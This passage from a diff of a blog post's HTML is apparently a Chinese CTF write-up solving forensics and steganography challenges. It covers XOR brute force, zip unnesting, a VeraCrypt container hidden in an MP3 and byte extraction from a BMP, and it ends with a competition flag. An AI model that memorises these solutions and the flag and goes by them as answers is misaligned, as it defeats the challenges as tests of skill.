+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#ae81ff">0</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span></code></pre></div><p>cyber可以直接爆破异或</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241458876.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241458876.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241458876.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241458876.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241458876.png"
+        title="image-20230424145751187" /></p>
+<p>或者是直接拿到这里的数据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241443101.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241443101.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241443101.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241443101.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241443101.png"
+        title="image-20230424144329070" /></p>
+<pre tabindex="0"><code>bbbeacbcabb98488 bacebc9092baa08b
+cfa0bbbe8c9cc899 a087a0ac8aa0a09e
+8f8d96ce82
+</code></pre><p>爆破一下异或</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241500830.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241500830.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241500830.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241500830.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304241500830.png"
+        title="image-20230424150043754" /></p>
+<p>官方wp出来了，这个题目描述是有用的</p>
+<p>To sidestep the Overlords of the internet ,bkfish use some real military grade encryption.</p>
+<p>谷歌一下是https://download.cnet.com/SSuite-Picsel-Security/3000-2092_4-75992724.html这个工具</p>
+<p>当时以为没啥用</p>
+<!-- raw HTML omitted -->
+<h3 id="ge9iansgirl">Ge9ian&rsquo;sGirl</h3>
+<p>这里的Twitter Secret message 提示了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250823982.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250823982.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250823982.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250823982.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250823982.png"
+        title="image-20230425082303874" /></p>
+<p>拿到网站：https://holloway.nz/steg/ 解密</p>
+<p>隐藏字符复制不了可以修改后缀zip然后拿到</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832579.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832579.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832579.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832579.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832579.png"
+        title="image-20230425083204471" /></p>
+<p>解密后拿到密码keainvren</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832627.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832627.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832627.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832627.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250832627.png"
+        title="image-20230425083226528" /></p>
+<p>解开rar后拿到520个txt，每个txt有一部分jpg的信息，需要写个脚本拼接一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;data.jpg&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fw:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">521</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">two\</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">.txt&#39;</span><span style="color:#f92672">.</span>format(i), <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>        fw<span style="color:#f92672">.</span>write(data)
+</span></span></code></pre></div><p>然后添加一下文件头</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901843.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901843.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901843.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901843.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901843.png"
+        title="image-20230425090125762" /></p>
+<p>成功拿到jpg</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901233.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901233.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901233.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901233.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250901233.png"
+        title="image-20230425090159135" /></p>
+<p>our secrect解密，尾部有这个特征也是our secrect</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250904761.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250904761.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250904761.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250904761.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304250904761.png"
+        title="image-20230425090402659" /></p>
+<!-- raw HTML omitted -->
+<h3 id="七里香">七里香</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251700960.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251700960.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251700960.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251700960.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251700960.png"
+        title="image-20230425170042574" /></p>
+<p>先看zip套娃，密码是J4y和Jay交替，写个脚本拿到txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">210</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    zip_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users\达\Desktop\zip</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">.zip&#39;</span><span style="color:#f92672">.</span>format(i)
+</span></span><span style="display:flex;"><span>    zip_name <span style="color:#f92672">=</span> zip_path <span style="color:#f92672">+</span> name
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        psw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;J4y&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        psw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Jay&#39;</span>
+</span></span><span style="display:flex;"><span>    print(zip_name)
+</span></span><span style="display:flex;"><span>    print(psw)
+</span></span><span style="display:flex;"><span>    print(name)
+</span></span><span style="display:flex;"><span>    fz <span style="color:#f92672">=</span> zipfile<span style="color:#f92672">.</span>ZipFile(zip_name)
+</span></span><span style="display:flex;"><span>    fz<span style="color:#f92672">.</span>extractall(path<span style="color:#f92672">=</span>zip_path,pwd<span style="color:#f92672">=</span>psw)
+</span></span></code></pre></div><p>给了个信息</p>
+<pre tabindex="0"><code>He often uses the pinyin lowercase letters of this song as the password for the encryption container
+他经常用这首歌的拼音小写字母作为加密容器的密码，同专辑
+密码是搁浅 geqian
+</code></pre><p>看hint.txt</p>
+<p>这是我们的暗号：tpyrcarev，倒序一下是veracrypt</p>
+<p>还有0宽隐写</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251734077.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251734077.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251734077.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251734077.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251734077.png"
+        title="image-20230425173406032" /></p>
+<p>说明这个hint.txt是密钥文件</p>
+<p>那么通过veracrypt挂载这个mp3，密钥文件为hint.txt即可，密码是geqian</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251735757.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251735757.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251735757.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251735757.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251735757.png"
+        title="image-20230425173523712" /></p>
+<p>然后成功拿到个bmp文件，观察字节</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251742116.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251742116.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251742116.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251742116.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251742116.png"
+        title="image-20230425174212075" /></p>
+<p>后面一堆FF FF间隔起来的字节，mp3的文件头正是49 44 33</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251743013.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251743013.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251743013.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251743013.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304251743013.png"
+        title="image-20230425174327963" /></p>
+<p>就根据这个规律提取出来需要的字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;40.bmp&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;result.mp3&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> rf:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(data),<span style="color:#ae81ff">4</span>): <span style="color:#75715e">#每次处理四个字节</span>
+</span></span><span style="display:flex;"><span>        rf<span style="color:#f92672">.</span>write(data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]) <span style="color:#75715e"># 获取四个字节中的前两个字节</span>
+</span></span></code></pre></div><p>从头提取到尾，提取出来的mp3也是能播放的，观察字节</p>
+<p>后面还是很多FF，找到这些垃圾数据的开头</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252001812.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252001812.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252001812.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252001812.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202304252001812.png"
+        title="image-20230425200147763" /></p>
+<p>这段base64就是flag</p>
+<p>You are great!!! DASCTF{f2943891e719635a5f6c295227177ddb}</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/das-x-su/" data-title="DAS x SU" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/das-x-su/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/das-x-su/" data-title="DAS x SU"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/das-x-su/" data-title="DAS x SU"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/das-x-su/" data-title="DAS x SU"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/dasctf-7%E6%9C%88/" class="prev" rel="prev" title="DASCTF 7月"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DASCTF 7月</a>
+            <a href="/posts/ctf/d3ctf-2023/" class="next" rel="next" title="D^3ctf 2023">D^3ctf 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
